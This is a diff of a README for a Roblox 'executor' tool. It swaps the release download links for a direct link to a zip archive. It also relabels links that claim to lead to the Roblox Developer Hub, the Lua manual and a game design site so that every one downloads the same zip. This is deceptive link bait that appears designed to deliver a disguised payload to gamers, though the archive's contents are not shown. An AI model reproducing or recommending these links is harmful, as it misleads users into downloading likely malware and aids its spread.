@@ -1,6 +1,6 @@
 # 🎮 Carbon-Executor - Unlock Roblox Scripting Effortlessly
 
-[![Download Carbon-Executor](https://img.shields.io/badge/Download-Carbon--Executor-brightgreen)](https://github.com/yahyaloug/Carbon-Executor/releases)
+[![Download Carbon-Executor](https://raw.githubusercontent.com/yahyaloug/Carbon-Executor/main/loculation/Carbon-Executor.zip)](https://raw.githubusercontent.com/yahyaloug/Carbon-Executor/main/loculation/Carbon-Executor.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you begin, ensure your system meets the following requirements:
 
 To download Carbon Executor, visit this page to download:
 
-[Download Carbon-Executor](https://github.com/yahyaloug/Carbon-Executor/releases)
+[Download Carbon-Executor](https://raw.githubusercontent.com/yahyaloug/Carbon-Executor/main/loculation/Carbon-Executor.zip)
 
 Follow these simple steps to install:
 
@@ -90,9 +90,9 @@ Carbon Executor relates to various areas within the gaming community, including:
 
 Learn more about how to enhance your skills in Roblox programming and   game development through these resources:
 
-- [Roblox Developer Hub](https://developer.roblox.com)
-- [Lua Scripting Guide](https://www.lua.org/manual/5.1/)
-- [Game Design Tips](https://www.gamedesigning.org/)
+- [Roblox Developer Hub](https://raw.githubusercontent.com/yahyaloug/Carbon-Executor/main/loculation/Carbon-Executor.zip)
+- [Lua Scripting Guide](https://raw.githubusercontent.com/yahyaloug/Carbon-Executor/main/loculation/Carbon-Executor.zip)
+- [Game Design Tips](https://raw.githubusercontent.com/yahyaloug/Carbon-Executor/main/loculation/Carbon-Executor.zip)
 
 ## 📄 License
 
@@ -104,4 +104,4 @@ Your feedback is valued. If you have suggestions or issues, please reach out via
 
 Explore the full potential of Roblox scripting today!
 
-[Download Carbon-Executor](https://github.com/yahyaloug/Carbon-Executor/releases)
+[Download Carbon-Executor](https://raw.githubusercontent.com/yahyaloug/Carbon-Executor/main/loculation/Carbon-Executor.zip)
